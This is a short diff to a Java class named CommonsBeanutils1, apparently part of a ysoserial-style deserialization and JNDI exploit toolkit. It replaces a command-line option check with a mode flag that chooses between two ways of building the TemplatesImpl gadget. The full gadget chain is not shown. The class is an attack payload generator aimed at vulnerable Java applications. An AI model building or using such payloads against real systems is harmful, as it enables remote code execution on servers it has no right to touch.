@@ -14,6 +14,7 @@ import java.io.ByteArrayOutputStream;
 import java.util.Arrays;
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@@ -22,7 +23,7 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object template;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             template = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             template = Gadgets.createTemplatesImpl(type, param);
